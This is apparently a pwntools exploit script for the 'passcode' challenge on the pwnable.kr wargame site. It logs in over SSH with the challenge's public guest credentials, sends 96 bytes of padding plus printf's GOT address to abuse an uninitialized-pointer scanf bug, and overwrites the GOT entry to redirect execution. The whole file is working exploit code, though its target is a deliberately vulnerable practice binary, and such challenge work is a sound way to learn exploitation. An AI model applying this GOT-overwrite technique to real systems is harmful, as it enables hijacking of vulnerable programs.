#coding=utf-8
from pwn import *

context.binary = './passcode'

debug = 0
if debug:
  p = process('./passcode')
else:
  s = ssh(host = 'pwnable.kr', port = 2222, user = 'passcode', password = 'guest')
  s.set_working_directory('/home/passcode')
  p = s.process('./passcode')

elf = ELF('./passcode')
payload = 'a' * 96 + p32(elf.symbols['got.printf'])
log.info('printf@got:{}'.format(hex(elf.symbols['got.printf'])))

#p.recvuntil('enter you name : ')
p.sendline(payload)
#p.recvuntil('enter passcode1')
p.sendline(str(0x80485d7))
print p.recvall(1)
